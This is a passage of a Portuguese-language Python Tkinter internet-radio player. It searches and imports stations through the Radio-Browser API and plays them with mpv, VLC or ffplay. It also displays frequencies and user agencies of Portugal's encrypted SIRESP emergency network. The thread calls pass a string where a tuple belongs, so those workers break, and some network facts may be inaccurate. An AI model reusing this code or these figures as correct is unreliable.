        tk.Entry(top, textvariable=self.search_var, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 9), width=18).pack(side="left", padx=6, ipady=4)

        self.cat_var = tk.StringVar(value="Tudo")
        tk.Label(top, text="CAT:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(8,0))
        cat_menu = tk.OptionMenu(top, self.cat_var, *self.CATEGORIAS, command=lambda _: self.refresh_lista())
        cat_menu.configure(bg=BTN_BG, fg=ACCENT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        cat_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        cat_menu.pack(side="left", padx=4)

        self.pais_var = tk.StringVar(value="Tudo")
        tk.Label(top, text="PAÍS:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold")).pack(side="left", padx=(8,0))
        pais_list = ["Tudo"] + list(self.PAISES_ISO.keys())
        pais_menu = tk.OptionMenu(top, self.pais_var, *pais_list, command=lambda _: self.refresh_lista())
        pais_menu.configure(bg=BTN_BG, fg=TEXT, relief="flat", highlightthickness=0, font=(FONT_MONO, 8))
        pais_menu["menu"].configure(bg=PANEL_BG, fg=TEXT)
        pais_menu.pack(side="left", padx=4)

        body = tk.Frame(self.tab_player, bg=BG)
        body.pack(fill="both", expand=True, padx=10, pady=(0,10))

        left = tk.Frame(body, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=340)
        left.pack(side="left", fill="y", padx=(0,10))
        left.pack_propagate(False)

        left_top = tk.Frame(left, bg=PANEL_BG)
        left_top.pack(fill="x", padx=8, pady=6)
        tk.Label(left_top, text="ESTAÇÕES", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(side="left")
        self.count_label = tk.Label(left_top, text="0", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8))
        self.count_label.pack(side="right")

        self.listbox = tk.Listbox(left, bg=PANEL_BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=0, font=(FONT_MONO, 9))
        self.listbox.pack(fill="both", expand=True, padx=8, pady=4)
        self.listbox.bind("<<ListboxSelect>>", self.on_select)
        self.listbox.bind("<Double-Button-1>", lambda e: self.play_radio())

        left_btns = tk.Frame(left, bg=PANEL_BG)
        left_btns.pack(fill="x", padx=8, pady=8)
        for txt, cmd in [("+ NOVA", self.nova_radio), ("🗑 REMOVER", self.remover_radio), ("★ FAV", self.toggle_fav)]:
            b = tk.Button(left_btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=4, pady=4, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)

        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        self.player_frame = tk.Frame(right, bg="#0a0a0a", highlightthickness=1, highlightbackground=ACCENT_DIM, height=200)
        self.player_frame.pack(fill="x", pady=(0,8))
        self.player_frame.pack_propagate(False)

        self.video_label = tk.Label(self.player_frame, text="📻 RADIO GLOBAL 2025\\n\\n• 40k+ estações via Radio-Browser API\\n• Portugal: Antena 1/2/3, TSF, Comercial, RFM\\n• SIRESP: 380-395 MHz TETRA (info, encriptado)\\n• Entidades: ANEPC, INEM, Bombeiros 149MHz, GNR, PSP\\n• Internacional: BBC, France Inter, RNE\\n\\nSelecione estação e PLAY\\nPlayer: VLC/MPV/FFplay", bg="#0a0a0a", fg=TEXT_DIM, font=(FONT_MONO, 10), justify="center")
        self.video_label.pack(expand=True, fill="both")

        status_row = tk.Frame(right, bg=BG)
        status_row.pack(fill="x", pady=2)
        self.status_label = tk.Label(status_row, text="● Pronto - Radio-Browser API + SIRESP info", bg=BG, fg="#00ff88", font=(FONT_MONO, 8, "bold"), anchor="w")
        self.status_label.pack(side="left", fill="x", expand=True)

        ctrl = tk.Frame(right, bg=BG)
        ctrl.pack(fill="x", pady=6)
        for txt, cmd, color in [("▶ PLAY RADIO", self.play_radio, ACCENT_DIM), ("⏹ STOP", self.stop_radio, "#1a0a0f"), ("📋 COPIAR URL", self.copiar_url, BTN_BG), ("📡 INFO FREQ", self.info_freq, BTN_BG)]:
            b = tk.Button(ctrl, text=txt, command=cmd, bg=color, fg=ACCENT if color==ACCENT_DIM else TEXT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, padx=10, pady=6, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)
        
        ctrl2 = tk.Frame(right, bg=BG)
        ctrl2.pack(fill="x", pady=3)
        for txt, cmd in [("🌐 WEBSDR.ORG", lambda: webbrowser.open("http://websdr.org")), ("📡 ANACOM QNAF", lambda: webbrowser.open("https://www.anacom.pt/render.jsp?categoryId=348130")), ("🚨 SIRESP.PT", lambda: webbrowser.open("https://www.siresp.pt"))]:
            b = tk.Button(ctrl2, text=txt, command=cmd, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2", highlightthickness=1, highlightbackground=ACCENT_DIM)
            b.pack(side="left", padx=3, fill="x", expand=True)

        form = tk.Frame(right, bg=BG)
        form.pack(fill="both", expand=True, pady=(8,0))

        self.fields = {}
        for key, label in [("nome","NOME"), ("url","URL STREAM (mp3/aac/m3u8)"), ("freq","FREQUÊNCIA"), ("pais","PAÍS"), ("categoria","CATEGORIA"), ("entidade","ENTIDADE")]:
            tk.Label(form, text=label, bg=BG, fg=ACCENT, font=(FONT_MONO, 7, "bold")).pack(anchor="w", pady=(4,1))
            if key=="categoria":
                var = tk.StringVar(value="Privadas")
                self.fields[key]=var
                opt = tk.OptionMenu(form, var, *self.CATEGORIAS[1:])
                opt.configure(bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 8))
                opt["menu"].configure(bg=PANEL_BG, fg=TEXT)
                opt.pack(fill="x", ipady=3)
            else:
                ent = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 8))
                ent.pack(fill="x", ipady=4)
                self.fields[key]=ent

        btns = tk.Frame(form, bg=BG)
        btns.pack(fill="x", pady=8)
        tk.Button(btns, text="💾 GUARDAR", command=self.guardar_radio, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=6, cursor="hand2").pack(side="left", fill="x", expand=True, padx=(0,4))
        tk.Button(btns, text="🧪 TESTAR", command=self.testar_url, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=6, cursor="hand2").pack(side="left", fill="x", expand=True, padx=(4,0))

    def refresh_lista(self):
        self.listbox.delete(0, "end")
        filtro = self.search_var.get().lower()
        cat = self.cat_var.get()
        pais = self.pais_var.get()
        self.filtered = []
        for r in self.radios:
            if cat!="Tudo" and r.get("categoria")!=cat:
                continue
            if pais!="Tudo" and r.get("pais")!=pais:
                continue
            if filtro and filtro not in r.get("nome","").lower() and filtro not in r.get("entidade","").lower():
                continue
            self.filtered.append(r)
        for r in self.filtered:
            fav = "★ " if r.get("fav") else "  "
            extra = " [SIRESP]" if r.get("categoria")=="SIRESP" else ""
            self.listbox.insert("end", fav + r.get("nome") + " (" + r.get("pais") + ")" + extra)
        try:
            self.count_label.configure(text=str(len(self.filtered)) + "/" + str(len(self.radios)))
        except:
            pass

    def on_select(self, evt):
        sel = self.listbox.curselection()
        if not sel:
            return
        canal = self.filtered[sel[0]]
        real_idx = next((i for i, x in enumerate(self.radios) if x["id"]==canal["id"]), None)
        self.selected_idx = real_idx
        for k in ["nome","url","freq","pais","entidade"]:
            if k in self.fields:
                w = self.fields[k]
                if isinstance(w, tk.Entry):
                    w.delete(0, "end")
                    w.insert(0, canal.get(k,""))
        if "categoria" in self.fields:
            self.fields["categoria"].set(canal.get("categoria","Privadas"))
        try:
            info = canal.get("info","")
            self.video_label.configure(text="▶ " + canal.get("nome") + "\\n" + canal.get("entidade") + " | " + canal.get("pais") + " | " + canal.get("freq") + "\\n\\n" + canal.get("url")[:90] + "\\n\\n" + info[:120])
        except:
            pass

    def nova_radio(self):
        self.selected_idx=None
        for k in ["nome","url","freq","pais","entidade"]:
            if k in self.fields and isinstance(self.fields[k], tk.Entry):
                self.fields[k].delete(0,"end")
        self.fields["categoria"].set("Privadas")
        self.listbox.selection_clear(0,"end")

    def guardar_radio(self):
        nome = self.fields["nome"].get().strip()
        url = self.fields["url"].get().strip()
        if not nome:
            messagebox.showwarning("Aviso","Nome obrigatório")
            return
        dados = {
            "id": self.radios[self.selected_idx]["id"] if self.selected_idx is not None else str(uuid.uuid4()),
            "nome": nome,
            "url": url,
            "freq": self.fields["freq"].get().strip(),
            "pais": self.fields["pais"].get().strip() or "Portugal",
            "categoria": self.fields["categoria"].get(),
            "entidade": self.fields["entidade"].get().strip(),
            "logo": "",
            "codec": "MP3/AAC",
            "fav": self.radios[self.selected_idx].get("fav", False) if self.selected_idx is not None else False
        }
        if self.selected_idx is not None:
            self.radios[self.selected_idx]=dados
        else:
            self.radios.append(dados)
        self.save_radios()
        self.refresh_lista()
        messagebox.showinfo("OK","Rádio guardada!")

    def remover_radio(self):
        if self.selected_idx is None:
            return
        if messagebox.askyesno("Confirmar","Remover?"):
            del self.radios[self.selected_idx]
            self.save_radios()
            self.selected_idx=None
            self.refresh_lista()
            self.nova_radio()

    def toggle_fav(self):
        if self.selected_idx is None:
            return
        self.radios[self.selected_idx]["fav"] = not self.radios[self.selected_idx].get("fav", False)
        self.save_radios()
        self.refresh_lista()

    def copiar_url(self):
        url = self.fields["url"].get() if self.selected_idx is not None else ""
        self.clipboard_clear()
        self.clipboard_append(url)
        self.status_label.configure(text="● URL copiada")

    def info_freq(self):
        freq = self.fields["freq"].get()
        nome = self.fields["nome"].get()
        messagebox.showinfo("Frequência", nome + "\\nFrequência: " + freq + "\\n\\nSIRESP: 380-385 MHz uplink / 390-395 MHz downlink TETRA\\nBombeiros: 149.0125-156 MHz\\nANACOM: www.anacom.pt")

    def testar_url(self):
        url = self.fields["url"].get().strip()
        if not url:
            messagebox.showwarning("Aviso","Sem URL - SIRESP é encriptado sem stream")
            return
        self.status_label.configure(text="● A testar: " + url[:60])
        threading.Thread(target=self.testar_worker, args=(url), daemon=True).start()

    def testar_worker(self, url):
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=10) as r:
                code = r.getcode()
                ctype = r.headers.get("Content-Type","")
                self.after(0, lambda: self.status_label.configure(text="● OK [" + str(code) + "] " + ctype + " - Pronto PLAY"))
        except Exception as e:
            self.after(0, lambda: self.status_label.configure(text="● ERRO: " + str(e)[:100]))

    def play_radio(self):
        url = self.fields["url"].get().strip()
        nome = self.fields["nome"].get()
        if not url:
            # SIRESP info
            if self.selected_idx is not None and self.radios[self.selected_idx].get("categoria")=="SIRESP":
                messagebox.showinfo("SIRESP", "SIRESP é rede TETRA encriptada 380-395 MHz\\nGerida por SIRESP S.A. e ANEPC\\nNão existe stream público por motivos de segurança\\n\\nFrequências ANACOM:\\nUplink: 380-385 MHz\\nDownlink: 390-395 MHz\\n\\nEntidades: PSP, GNR, PJ, SEF, INEM, Bombeiros, etc")
                return
            messagebox.showwarning("Aviso","Sem URL de stream")
            return
        self.status_label.configure(text="● A reproduzir: " + nome)
        self.play_with_fallback(url, nome)

    def play_with_fallback(self, url, nome=""):
        self.stop_radio()
        def try_mpv():
            try:
                if shutil.which("mpv"):
                    self.current_player_process = subprocess.Popen(["mpv", "--no-video", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.status_label.configure(text="● PLAYING MPV: " + nome)
                    return True
            except:
                pass
            return False
        def try_vlc():
            try:
                import vlc
                instance = vlc.Instance("--no-xlib")
                self.current_vlc_player = instance.media_player_new()
                media = instance.media_new(url)
                media.add_option(":http-user-agent=" + self.user_agent)
                self.current_vlc_player.set_media(media)
                self.current_vlc_player.play()
                self.status_label.configure(text="● PLAYING VLC: " + nome)
                return True
            except:
                return False
        def try_ffplay():
            try:
                if shutil.which("ffplay"):
                    self.current_player_process = subprocess.Popen(["ffplay", "-nodisp", "-autoexit", "-loglevel", "quiet", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.status_label.configure(text="● PLAYING FFPLAY: " + nome)
                    return True
            except:
                return False
        def try_browser():
            try:
                webbrowser.open(url)
                self.status_label.configure(text="● ABERTO BROWSER: " + nome)
                return True
            except:
                return False

        success = try_mpv() or try_vlc() or try_ffplay() or try_browser()
        if not success:
            messagebox.showerror("Erro", "Nenhum player encontrado. Instale mpv/vlc.\\nURL: " + url)

    def stop_radio(self):
        try:
            if self.current_vlc_player:
                self.current_vlc_player.stop()
                self.current_vlc_player = None
            if self.current_player_process:
                self.current_player_process.terminate()
                self.current_player_process = None
            self.status_label.configure(text="● Parado")
        except:
            pass

    # ─── SEARCH TAB ───
    def build_search_tab(self):
        top = tk.Frame(self.tab_search, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="🔍 BUSCAR RÁDIOS NA INTERNET - Radio-Browser API 40k+ + SIRESP", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(top, text="API: de1.api.radio-browser.info - Todos países - SIRESP ANEPC - Entidades públicas/privadas", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        search_row = tk.Frame(self.tab_search, bg=BG)
        search_row.pack(fill="x", padx=10, pady=8)
        tk.Label(search_row, text="Query:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.search_entry = tk.Entry(search_row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 11), width=25)
        self.search_entry.pack(side="left", padx=8, fill="x", expand=True, ipady=5)
        self.search_entry.insert(0, "Portugal")
        self.search_entry.bind("<Return>", lambda e: self.search_radios())

        btn_row = tk.Frame(self.tab_search, bg=BG)
        btn_row.pack(fill="x", padx=10, pady=4)
        for txt, cmd in [("BUSCAR RADIO-BROWSER", self.search_radios), ("🇵🇹 PT 500+ RÁDIOS", lambda: self.fetch_by_country("PT")), ("🇧🇷 BR", lambda: self.fetch_by_country("BR")), ("🇪🇸 ES", lambda: self.fetch_by_country("ES")), ("🚨 SIRESP INFO", self.fetch_siresp_info)]:
            b = tk.Button(btn_row, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)

        btn_row2 = tk.Frame(self.tab_search, bg=BG)
        btn_row2.pack(fill="x", padx=10, pady=4)
        for country, code in [("USA", "US"), ("UK", "GB"), ("FR", "FR"), ("DE", "DE"), ("AO", "AO"), ("MZ", "MZ")]:
            b = tk.Button(btn_row2, text=country, command=lambda c=code: self.fetch_by_country(c), bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=4, pady=3, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)

        self.search_listbox = tk.Listbox(self.tab_search, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=12)
        self.search_listbox.pack(fill="x", padx=10, pady=8)
        self.search_listbox.bind("<<ListboxSelect>>", self.on_search_select)
        self.search_listbox.bind("<Double-Button-1>", lambda e: self.import_selected())

        btns2 = tk.Frame(self.tab_search, bg=BG)
        btns2.pack(fill="x", padx=10, pady=4)
        for txt, cmd in [("📥 IMPORTAR SELECIONADAS", self.import_selected), ("📥 IMPORTAR TODAS", self.import_all), ("🌐 ABRIR STREAM", self.open_stream_search)]:
            b = tk.Button(btns2, text=txt, command=cmd, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=5, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)

        self.search_out = scrolledtext.ScrolledText(self.tab_search, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=10, wrap="word")
        self.search_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.search_out.insert("1.0", "Radio Search 2025 pronto.\\n\\n• Radio-Browser API: 40k+ estações mundiais\\n• PT: Antena 1/2/3, TSF, Comercial, RFM, etc\\n• SIRESP: Rede TETRA 380-395 MHz ANEPC\\n• Entidades: PSP, GNR, INEM, Bombeiros 149MHz\\n• Privadas: Bauer, Renascença, Global Media\\n\\nClique 🇵🇹 PT 500+ RÁDIOS para carregar rádios portuguesas reais da internet\\n")

    def search_radios(self):
        q = self.search_entry.get().strip()
        if not q:
            return
        self.search_out.delete("1.0", "end")
        self.search_out.insert("1.0", "Buscando rádios para: " + q + " via Radio-Browser API...\\n")
        threading.Thread(target=self.search_worker, args=(q), daemon=True).start()

    def search_worker(self, query):
        try:
            import urllib.request, json
            # Use radio-browser search
            url = "https://de1.api.radio-browser.info/json/stations/search?name=" + urllib.parse.quote(query) + "&limit=100&hidebroken=true"
            req = urllib.request.Request(url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read().decode())
                self.search_results = data
                def update():
                    self.search_listbox.delete(0, "end")
                    for st in data[:100]:
                        self.search_listbox.insert("end", st.get("name","") + " | " + st.get("country","") + " | " + st.get("codec","") + " | " + str(st.get("bitrate","")) + "kbps")
                    self.search_out.delete("1.0", "end")
                    self.search_out.insert("1.0", "Encontradas " + str(len(data)) + " estações para '" + query + "' via Radio-Browser\\n\\nClique IMPORTAR para adicionar à lista principal\\n")
                self.after(0, update)
        except Exception as e:
            self.after(0, lambda: self.search_out.insert("end", "\\nErro API Radio-Browser: " + str(e) + "\\nTente PT/BR/ES botões\\n"))

    def fetch_by_country(self, code):
        self.search_out.delete("1.0", "end")
        self.search_out.insert("1.0", "A buscar rádios do país " + code + " via Radio-Browser API...\\n")
        threading.Thread(target=self.fetch_country_worker, args=(code), daemon=True).start()

    def fetch_country_worker(self, code):
        try:
            import urllib.request, json
            url = "https://de1.api.radio-browser.info/json/stations/bycountrycodeexact/" + code + "?limit=500&hidebroken=true&order=votes&reverse=true"
            req = urllib.request.Request(url, headers={"User-Agent": self.user_agent})
            with urllib.request.urlopen(req, timeout=20) as r:
                data = json.loads(r.read().decode())
                self.search_results = data
                def update():
                    self.search_listbox.delete(0, "end")
                    for st in data[:200]:
                        self.search_listbox.insert("end", st.get("name","")[:40] + " | " + st.get("country","") + " | " + st.get("tags","")[:30])
                    self.search_out.delete("1.0", "end")
                    self.search_out.insert("1.0", "País " + code + " - Encontradas " + str(len(data)) + " estações\\nOrdenadas por votos (populares primeiro)\\nClique IMPORTAR TODAS para adicionar 200+ à lista principal\\n\\nExemplos:\\n")
                    for st in data[:5]:
                        self.search_out.insert("end", "• " + st.get("name","") + " - " + st.get("url_resolved","")[:60] + "\\n")
                self.after(0, update)
        except Exception as e:
            self.after(0, lambda: self.search_out.insert("end", "\\nErro: " + str(e) + "\\n"))

    def fetch_siresp_info(self):
        self.search_out.delete("1.0", "end")
        self.search_out.insert("1.0", "🚨 SIRESP - SISTEMA INTEGRADO REDES EMERGÊNCIA E SEGURANÇA\\n\\n"
            "Entidade: SIRESP S.A. + ANEPC (Autoridade Nacional Emergência Proteção Civil)\\n"
            "Tecnologia: TETRA (Terrestrial Trunked Radio) encriptado\\n"
            "Frequências ANACOM:\\n  Uplink: 380-385 MHz\\n  Downlink: 390-395 MHz\\n"
            "Banda: 380-400 MHz - Reservada Estado\\n\\n"
            "ENTIDADES LIGADAS SIRESP:\\n"
            "• ANEPC, GNR, PSP, PJ, SEF, SIS, Autoridade Marítima\\n"
            "• INEM, Bombeiros (Federação + CB), CVP\\n"
            "• ICNF, IPMA, DGRM, Autoridades Portuárias\\n"
            "• Exército, Força Aérea, Marinha (ligação) \\n\\n"
            "OUTRAS REDES PÚBLICAS PT:\\n"
            "• ROB - Rede Operacional Bombeiros: 149.0125 - 156 MHz FM\\n"
            "• RNSI - Rede Nacional Segurança Interna (dados)\\n"
            "• SIRESP-GL - Geolocalização\\n\\n"
            "NOTA: TETRA SIRESP é encriptado, sem stream público por segurança operacional.\\n"
            "Para OSINT: consultar ANACOM QNAF, relatórios ANEPC, concursos SIRESP S.A.\\n"
            "Fontes: www.siresp.pt, www.anacom.pt, www.prociv.pt\\n")

    def on_search_select(self, evt):
        sel = self.search_listbox.curselection()
        if not sel or not self.search_results:
            return
        idx = sel[0]
        if idx < len(self.search_results):
            st = self.search_results[idx]
            self.search_out.delete("1.0", "end")
            self.search_out.insert("1.0", "ESTAÇÃO SELECIONADA:\\nNome: " + st.get("name","") + "\\nPaís: " + st.get("country","") + "\\nURL: " + st.get("url_resolved","") + "\\nCodec: " + st.get("codec","") + " " + str(st.get("bitrate","")) + "kbps\\nTags: " + st.get("tags","")[:100] + "\\nVotes: " + str(st.get("votes","")) + "\\nHomepage: " + st.get("homepage","") + "\\n")

    def import_selected(self):
        sel = self.search_listbox.curselection()
        if not sel or not self.search_results:
            messagebox.showwarning("Aviso","Selecione estações")
            return
        added = 0
        for idx in sel:
            if idx < len(self.search_results):
                st = self.search_results[idx]
                url = st.get("url_resolved") or st.get("url")
                if not url:
                    continue
                if any(r["url"] == url for r in self.radios):
                    continue
                nova = {
                    "id": str(uuid.uuid4()),
                    "nome": st.get("name","")[:60],
                    "url": url,
                    "pais": st.get("country",""),
                    "categoria": "Internacional" if st.get("country")!="Portugal" else "Privadas",
                    "freq": st.get("codec","") + " " + str(st.get("bitrate","")) + "kbps",
                    "entidade": st.get("tags","")[:30],
                    "logo": st.get("favicon",""),
                    "codec": st.get("codec",""),
                    "fav": False
                }
                self.radios.append(nova)
                added += 1
        self.save_radios()
        self.refresh_lista()
        self.search_out.insert("end", "\\n✓ Importadas " + str(added) + " estações - Total agora: " + str(len(self.radios)) + "\\n")

    def import_all(self):
        if not self.search_results:
            return
        added = 0
        for st in self.search_results[:200]:
            url = st.get("url_resolved") or st.get("url")
            if not url or any(r["url"] == url for r in self.radios):
                continue
            nova = {
                "id": str(uuid.uuid4()),
                "nome": st.get("name","")[:60],
                "url": url,
                "pais": st.get("country",""),
                "categoria": "Internacional" if st.get("country")!="Portugal" else "Privadas",
                "freq": st.get("codec",""),
                "entidade": "",
                "logo": st.get("favicon",""),
                "codec": st.get("codec",""),
                "fav": False
            }
            self.radios.append(nova)
            added += 1
        self.save_radios()
        self.refresh_lista()
        messagebox.showinfo("Importado", str(added) + " rádios importadas de " + str(len(self.search_results)) + " - Total: " + str(len(self.radios)))

    def open_stream_search(self):
        sel = self.search_listbox.curselection()
        if not sel or not self.search_results:
            return
        st = self.search_results[sel[0]]
        url = st.get("url_resolved") or st.get("url")
        if url:
            webbrowser.open(url)

    # ─── PAISES TAB ───
    def build_paises_tab(self):
        top = tk.Frame(self.tab_paises, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="🌍 RÁDIOS POR PAÍS - TODOS OS PAÍSES DISPONÍVEIS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(top, text="Clique no país para buscar 500+ estações via Radio-Browser API", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        grid = tk.Frame(self.tab_paises, bg=BG)
        grid.pack(fill="both", expand=True, padx=10, pady=10)

        for i in range(4):
            grid.grid_columnconfigure(i, weight=1)

        paises = [
            ("🇵🇹 Portugal", "PT"), ("🇧🇷 Brasil", "BR"), ("🇪🇸 Espanha", "ES"), ("🇫🇷 França", "FR"),
            ("🇬🇧 UK", "GB"), ("🇺🇸 USA", "US"), ("🇩🇪 Alemanha", "DE"), ("🇮🇹 Itália", "IT"),
            ("🇦🇴 Angola", "AO"), ("🇲🇿 Moçambique", "MZ"), ("🇨🇻 Cabo Verde", "CV"), ("🇨🇭 Suíça", "CH"),
            ("🇧🇪 Bélgica", "BE"), ("🇳🇱 Holanda", "NL"), ("🇨🇦 Canadá", "CA"), ("🇦🇺 Austrália", "AU"),
            ("🇯🇵 Japão", "JP"), ("🇮🇳 Índia", "IN"), ("🇨🇳 China", "CN"), ("🇷🇺 Rússia", "RU"),
        ]
        for idx, (nome, code) in enumerate(paises):
            r = idx // 4
            c = idx % 4
            b = tk.Button(grid, text=nome + "\\n" + code + "\\n500+", command=lambda cd=code: self.fetch_by_country(cd), bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 9, "bold"), relief="flat", bd=0, highlightthickness=1, highlightbackground=ACCENT_DIM, padx=10, pady=10, cursor="hand2")
            b.grid(row=r, column=c, padx=5, pady=5, sticky="nsew")

        self.paises_out = scrolledtext.ScrolledText(self.tab_paises, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, height=8)
        self.paises_out.pack(fill="x", padx=10, pady=10)
        self.paises_out.insert("1.0", "Países disponíveis: Todos via Radio-Browser API\\nTotal estações globais: 40k+\\n\\nPT: 500+ | BR: 2000+ | USA: 5000+ | UK: 1000+ | etc\\nClique num país acima para carregar\\n")

    # ─── SIRESP TAB ───
    def build_siresp_tab(self):
        top = tk.Frame(self.tab_siresp, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="🚨 SIRESP - SISTEMA INTEGRADO REDES EMERGÊNCIA SEGURANÇA PT", bg=BG, fg="#ff3b3b", font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="TETRA 380-395 MHz Encriptado - ANEPC - Todas entidades públicas", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        btn_row = tk.Frame(self.tab_siresp, bg=BG)
        btn_row.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("INFO SIRESP", self.fetch_siresp_info), ("FREQUÊNCIAS ANACOM", self.show_anacom), ("ENTIDADES", self.show_entidades_siresp), ("MAPA COBERTURA", self.show_cobertura)]:
            b = tk.Button(btn_row, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=5, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)

        self.siresp_out = scrolledtext.ScrolledText(self.tab_siresp, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.siresp_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.siresp_out.insert("1.0", "🚨 SIRESP - SISTEMA INTEGRADO DE REDES DE EMERGÊNCIA E SEGURANÇA DE PORTUGAL\\n\\n"
            "GESTÃO: SIRESP S.A. (49% Estado) + Motorola Solutions\\n"
            "TECNOLOGIA: TETRA (Terrestrial Trunked Radio) - ETSI EN 300 392\\n"
            "ENCRIPTAÇÃO: TEA2/TEA3 - AIE + E2EE opcional\\n\\n"
            "FREQUÊNCIAS OFICIAIS ANACOM QNAF:\\n"
            "  • Uplink (móvel→base): 380.000 - 385.000 MHz\\n"
            "  • Downlink (base→móvel): 390.000 - 395.000 MHz\\n"
            "  • Duplex: 10 MHz\\n"
            "  • Largura canal: 25 kHz\\n"
            "  • Modulação: π/4 DQPSK\\n\\n"
            "ARQUITETURA:\\n"
            "  • 600+ estações base\\n"
            "  • Cobertura 98% território + 100% autoestradas\\n"
            "  • 2 centros comutação (Lisboa/Porto) + backup\\n"
            "  • Satélite backup\\n\\n"
            "ENTIDADES (40k+ terminais):\\n"
            "  • ANEPC, GNR, PSP, PJ, SEF/AIMA, SIS, PJ Militar\\n"
            "  • INEM, Bombeiros (400+ CB), CVP, ICNF\\n"
            "  • Marinha, Exército, FAP (gateway)\\n"
            "  • IPMA, DGRM, APA, Infraestruturas\\n\\n"
            "NOTA OSINT: Stream público NÃO EXISTE por segurança.\\n"
            "Fontes públicas: siresp.pt, anacom.pt (QNAF), prociv.pt, DRE\\n"
            "Para monitorização legal: SDR 380MHz mostra portadora TETRA, mas tráfego encriptado\\n")

    def show_anacom(self):
        self.siresp_out.delete("1.0", "end")
        self.siresp_out.insert("1.0", "ANACOM - QNAF - FAIXA 380-400 MHz\\n\\n"
            "380-385 MHz: Serviço Móvel - SIRESP Uplink - Uso exclusivo Estado\\n"
            "385-387 MHz: PPDR + Banda larga\\n"
            "387-390 MHz: PPDR\\n"
            "390-395 MHz: SIRESP Downlink\\n"
            "395-400 MHz: PPDR / Futuro broadband\\n\\n"
            "Legislação: DL 151-A/2000, Portaria 1473-B/2008\\n"
            "QNAF: https://www.anacom.pt/render.jsp?categoryId=348130\\n"
            "SIRESP: https://www.siresp.pt\\n\\n"
            "OUTRAS FREQS EMERGÊNCIA PT:\\n"
            "• ROB Bombeiros: 149.0125, 149.2875, 149.3125, 151.025, 152.5875, 152.6375 MHz FM 12.5kHz\\n"
            "• INEM: 168.250 MHz (antigo) + SIRESP\\n"
            "• GNR: 158-173 MHz VHF (migrou SIRESP)\\n"
            "• Proteção Civil: 149-151 MHz + SIRESP\\n")

    def show_entidades_siresp(self):
        self.siresp_out.delete("1.0", "end")
        self.siresp_out.insert("1.0", "ENTIDADES SIRESP - LISTA COMPLETA 2025\\n\\n"
            "FORÇAS SEGURANÇA:\\n"
